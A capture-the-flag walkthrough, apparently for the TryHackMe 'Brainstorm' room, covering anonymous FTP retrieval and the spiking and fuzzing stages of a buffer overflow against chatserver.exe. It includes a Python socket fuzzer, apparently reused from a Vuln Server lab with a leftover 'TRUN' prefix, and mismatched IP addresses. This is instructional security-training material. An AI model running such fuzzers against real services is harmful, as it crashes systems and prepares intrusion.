
---

### Deploy Machine and Scan Network

- ![image](https://user-images.githubusercontent.com/94720207/169432767-1e87baf5-db18-4c5e-9b8c-a4d0acf1c83e.png)

- ![image](https://user-images.githubusercontent.com/94720207/169433751-06697c6d-d27a-451f-8afb-1b7fba777dac.png)

---

### Accesing Files

1. First I will check that `FTP` port accesing with `anonymous` login and download the `chatserver.exe` and the `essfunc.dll` from it
    
    - ![image](https://user-images.githubusercontent.com/94720207/169436929-93cad986-8310-402d-aa84-c4f39d72d45c.png)
    
2. As this is a buffer overflow Lab, it seems we got out `.exe` and `.dll` to exploit, so, nothing much more to do here...
    
    - **Note: It's a little bit obvious that this room is based on the "Vuln Server" exploit, using default port 9999 and `essfunc.dll`...**
    
    - **Actually, `Vuln Server` is allmost the same walkthrought, so I recommend doing it before doing `Brainstorm`** 
        
    - [**Click here to read the full write up I did of `Vuln Server`**](/Cyber-Security-&-Hacking/Buffer-Overflow/buffer-overflow.md)
    
        - I will use the same setup for `Vuln Server`:
        
            - Using Windows 10 Pro on a bare metal CPU
            - Using Kali Linux in a VMware Pro VM
        
        - So I will transfer the files to a folder to the Windows 10 and use from there `Immunity Debugger` and also run the `chatserver.exe` binary.
        
            - ![image](https://user-images.githubusercontent.com/94720207/169447433-211b2e85-534b-4bd5-9f2f-ff799b1472d1.png)
          
        - Easy! 

---

### Buffer Overflow

- I will use the same steps used in `Vuln Server` lab... this steps work with allmost all the buffer overflow procedures:

- **Steps to conduct a buffer overflow:**

    1. Spiking - Method to find vuln part of the program
    2. Fuzzing - Send a bunch of characters and see if we can break it
    3. Finding the Offset - At what point did we break it
    4. Overwriting the EIP - Overwriting the Poiting Address and control it
    5. Finding Bad Characters - ...
    6. Finding the Right Module - ...
    7. Generating Shellcode - Once we know the bad characters and right module we can generate a shellcode
    8. Root!

---

### Spiking

- First of all, I will run `chatserver.exe` as administrator and then start `Immunity Debugger` and attach the program. 
    
    - ![image](https://user-images.githubusercontent.com/94720207/169447906-08c9b9a4-ae4a-4634-801f-260fe36a3f63.png) 

    - ![image](https://user-images.githubusercontent.com/94720207/169447827-45f81402-77c1-4a3e-af73-bae1465a264d.png)

- Then, I will run the Immunity Debugger with "play".

    - ![image](https://user-images.githubusercontent.com/94720207/169448256-98b7a075-5faf-466c-a79b-0845450d1362.png)

        - Running and ready to go!

- On Kali Linux:

    1. Connect to ChatServer:
        
        - Using the IP Address of the Windows Machine **192.168.10.100** + VulnServer Port **9999** (Default)
            
        - ![image](https://user-images.githubusercontent.com/94720207/169188519-02fab4e5-91e4-4272-a788-9239ad878c4a.png)
           
        - On Kali: `nc -nv 192.168.1.100 9999`
            
        - ![image](https://user-images.githubusercontent.com/94720207/169448471-a117bef5-2d59-40e8-9a37-19f0aeb3b263.png)
 
 - **It looks that this program `Chat Server` take commands based on what you type AKA `strings` to generate a `username`**
 
 - **The username request a `max of 20 characters`**
 
     - This means, maybe the buffer overflow and/or the pointer of `EIP` that we need to exploit is located after those 20 characters...maybe 21...maybe 2739?, 666?!, who knows?!
     
     - So, **we will do our `spiking` process to know how many bytes do we need to crash the program `chatserver.exe`**
     
- **As difference with `Vuln Server` Lab, here we are NOT using commands, just a user `string`**

    - **So, instead of using **`generic_send_tcp`** technique, I will write a simple python script doing the following:**

```python
#!/usr/bin/python

print "A" * 5000
```

- Or just using a python command:

    - `python -c 'print "A" * 5000'` 

- With this simple script we will generate 5000 bytes of "A's" at once:

    - ![image](https://user-images.githubusercontent.com/94720207/169452006-9a56b1a1-57e0-4207-bebd-3ab5640cb374.png)

- And we will copy and paste it to the program, it's just like a "manual fuzzing" adn then press `enter`:

    - ![image](https://user-images.githubusercontent.com/94720207/169452204-f1194a76-9fce-4845-8ed0-0b7618825ffb.png)

- The program didn't crash, it still working and is prompting for more info, meanwhile the `chatserver.exe` looks like this:

    - ![image](https://user-images.githubusercontent.com/94720207/169454155-e667ae59-3089-4558-8e01-4ca8d70afb6d.png)
    
        - **It looks like there are no more than 20 A's, this means, this string is protected and IS NOT VULNERABLE because it's handling correctly the `buffer space`**
        
- After we press enter we found another prompt asking for a message: 

    - ![image](https://user-images.githubusercontent.com/94720207/169453925-09edcc12-9a61-46f8-9578-33c4e0c3e970.png)

- We can add any string we want and it don't show a maximum of chars, maybe the developer forgot to sanitize this input ;) 

    - ![image](https://user-images.githubusercontent.com/94720207/169455148-cc60b367-2882-49e1-874c-570e3d92f791.png)

- Hoew about trying to crash this prompt then?... 5000 A's I choose you!!!

    - ![image](https://user-images.githubusercontent.com/94720207/169455285-758afe2b-f9ab-46a9-a663-14e637ccfa4b.png)
    
- BOOM!!! We did it!!! The `chatserver.exe` have just crashed

    - ![image](https://user-images.githubusercontent.com/94720207/169455495-f7924ac6-a8da-42e6-ae57-f6c1c10e08db.png)

- Bota fixa papai!

    - If we look at `EBP` we can see `41414141`: THAT'S THE HEX CODE FOR: `AAAA`
    
        - ![image](https://user-images.githubusercontent.com/94720207/169456928-65563691-936f-441c-9ade-edf2f7c31752.png) 

    - Also, we went over `ESP` with a bunch of "A"

    - Finally, we get into `EIP` too with `41414141`: THA'TS THE HEX CODE FOR: `AAAA`

        - Something like this _(the same as Vuln Server Lab!)_: 
        
            - ![image](https://user-images.githubusercontent.com/94720207/169455788-c8e5d6de-ef79-4b4d-9de3-1aee3aa4c8a1.png)

- Remember: **The `EIP` is the important factor!**

    - If we control `EIP` we can point somethin malicious! But for that, we need to locate "where's `EIP` now?"

- NOTE: The program has crashed, so we will need to restart the `Chat Server` and attach it again to the `Immunity Debugger`

    - **It's better to close everything and start from 0 to avoid errors** 

---

### Fuzzing 

- We already know that the program `Chat Server` can crash somewhere if we send a string overflow of 5000 bytes (A's)

- Fuzzing is very similar to spiking:

    - We will try to send a bunch of characters at a specific command and try to break it... 
    - The difference is that we already know which command is vulnerable (`write a message`) 

- It's time to present...the python script for Fuzzing ahhhhhh (monk chant):

    - Actually, I'm using the same scripts I used in `Vuln Server` lab!

```python
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.1.100', 9999))
                
                s.send(('TRUN /.:/' + buffer))
                s.close()
                sleep(1)
                buffer = buffer + "A"*100
        
        except:
                print "Fuzzing crashed at %s bytes" % str(len(buffer))
                sys.exit()
```

- You can call it something like: `1_brainstorm.py`

    - **IMPORTANT: You need to chmod +x to make it executable** 
    
    - ![image](https://user-images.githubusercontent.com/94720207/169457936-a8693374-33ff-4aec-bb23-207f799a255d.png)
 
- Now, I will comment it line by line:

```python
# We declare we are using python:
#!/usr/bin/python

# We import sys & socket modules, so we can pull specific IPv4 & Port
# For example, for using "socket" & "connect" commands
import sys, socket

# We import from sleep module, only the "time" command
# We will use it for wait 1 second "sleep(1)"
from time import sleep

# Declaring a "buffer" variable
# Inside "buffer" variable, we have 100 A's (one hunded "A")
buffer = "A" * 100

# While True, we will loop and try something:
while True:
        try:
                # Try to connect to this socket:
                    # socket.AF_INET = IPv4
                    # socket.SOCK_STREAM = PORT
                    
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.1.100', 9999))
                
                # Once we've connected, we will send a "TRUN" command plus:  "s.send(('TRUN /.:/' + buffer))"
                
                    # We are using TRUN because we know is the vulnerable command in this case.
                    # The registers /.:/ are the strings that the command needs to "understand" the command (those appear in the string of the Regs in Immunity Debugger)
                    # + buffer: We are adding the buffer variable "A * 100", so...
                        
                        # WE ARE SENDING: TRUN /.:/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
                        
                    # Then, we are closing the connection with "s.close()"
                    
                    # Then, we sleep for 1 second the program with "sleep(1)"
                    
                    # Finally, we add to the variable "buffer" other A*100, so now, it will send 200...
                    
                    # The loop repeats: 100,200,300,400,500,600... the buffer will get bigger and bigger until the program breaks.
        
        # THE TRICK IS, WE ARE TRYING TO NARROW DOWN WHERE THE PROGRAM IS BREAKING AND WITH WHICH SPECIFIC BYTE SIZE.
        # SO, WE GOING TO FUZZ IT:
                                                        
                s.send(('TRUN /.:/' + buffer))
                s.close()
                sleep(1)
                buffer = buffer + "A"*100

        # WHEN IT BREAKS, IT WILL PRINT AN EXCEPTION SHOWING EXACTLY WHERE IT CRASHED:
        
        except:
                print "Fuzzing crashed at %s bytes" % str(len(buffer))
                sys.exit()
```
 








---

### References

- https://tryhackme.com/room/brainstorm
- https://github.com/Fz3r0/Fz3r0/blob/main/Cyber-Security-&-Hacking/Buffer-Overflow/buffer-overflow.md
- https://www.youtube.com/watch?v=T1-Sds8ZHBU
